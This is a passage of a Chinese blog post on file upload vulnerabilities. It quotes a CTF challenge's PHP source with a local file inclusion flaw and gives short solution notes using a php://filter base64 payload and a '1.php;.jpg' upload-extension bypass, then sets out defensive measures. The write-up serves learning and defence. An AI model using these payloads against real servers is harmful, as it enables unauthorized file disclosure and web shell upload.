+error_reporting(0);
+define(&#39;FROM_INDEX&#39;, 1);
+$op = empty($_GET[&#39;op&#39;]) ? &#39;home&#39; : $_GET[&#39;op&#39;];
+if(!is_string($op) || preg_match(&#39;/\.\./&#39;, $op))
+    die(&#39;Try it again and I will kill you! I freaking hate hackers!&#39;);
+ob_start(&#39;ob_gzhandler&#39;);
+function page_top($op) &#123;
+?&gt;&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;Panduploader::&lt;?= htmlentities(ucfirst($op)); ?&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;header&quot;&gt;
+&lt;center&gt;&lt;a href=&quot;?op=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt;
+&lt;/div&gt;
+&lt;div id=&quot;body&quot;&gt;
+&lt;?php
+&#125;
+function fatal($msg) &#123;
+?&gt;&lt;div class=&quot;article&quot;&gt;
+&lt;h2&gt;Error&lt;/h2&gt;
+&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;?php
+exit(1);
+&#125;
+function page_bottom() &#123;
+?&gt;
+    &lt;/div&gt;
+    &lt;center&gt;
+&lt;div id=&quot;footer&quot;&gt;
+&lt;div&gt;
+&lt;p&gt;
+&lt;span&gt;2017 &amp;copy; &lt;/span&gt; All rights reserved.
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;&lt;?php
+ob_end_flush();
+&#125;
+register_shutdown_function(&#39;page_bottom&#39;);
+page_top($op);
+if(!(include $op . &#39;.php&#39;))
+    fatal(&#39;no such page&#39;);
+?&gt;        //缩短长度把转行都去了
+</code></pre>
+<p>通过这个分析，大概懂了为什么文件加.php提醒没有此页面的原因。</p>
+<p>通过御剑后台扫描扫描出后台的信息，有flag.php页面，则</p>
+<p>op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</p>
+<p>则获得flag的base64加密后的数据，进行解密，获得flag。</p>
+<p>2.看到file还有题目名就想包含一下，当然是尝试的flag.php，结果什么都没有，用php:&#x2F;&#x2F;filter试试发现作者已经过滤了。右键源码看到upload.php上传文件名为1.php;.jpg，绕过检测，包含一下发现一句话的<?php?>这些字符被过滤，从其他文章处看到构造了上传得到flag</p>
+<p>3.尝试构造payload来进行测试php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag得到的结果再在base64解码就可以得到flag了</p>
+<p>4.点开链接发现什么都没有用御剑扫一下后台看看有没有隐藏文件其他php文件打开都是空页，index.php打开没什么不一样，下载111.zip用phpstorm打开，得到flag发现这就是个文件。</p>
+<hr>
+<hr>
+<h3 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h3><p><strong>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</strong><br>防范文件上传漏洞常见的几种方法：</p>
+<p>1.文件上传的目录设置为不可执行<br><strong>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</strong></p>
+<p>2.判断文件类型<br><strong>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</strong></p>
+<p>3.使用随机数改写文件名和文件路径<br><strong>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</strong></p>
+<p>4.单独设置文件服务器的域名<br><strong>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://www.2cto.com/kf/ware/Java/">Java</a>script的XSS利用等问题将得到解决。</strong></p>
+<p><strong>系统开发阶段的防御</strong><br>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。<br><strong>系统运行阶段的防御</strong><br>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Daniel</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://eatingcrime.github.io/2023/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://eatingcrime.github.io/2023/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Daniel</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/03/26/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="蚁剑教程">
+                        
+                        <span class="card-title">蚁剑教程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/03/26/%E8%8F%9C%E5%88%80/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="菜刀教程">
+                        
+                        <span class="card-title">菜刀教程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="917184825"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Daniel</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/eatingcrime" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1012375523@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=101237523" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 101237523" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+        <!-- <script src='https://unpkg.com/mermaid@latest/dist/mermaid.min.js'></script> -->
+        <script src='/libs/mermaid/mermaid.min.js'></script>
+        <script>
+          if (window.mermaid) {
+            mermaid.initialize({theme: 'forest'});
+          }
+        </script>
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
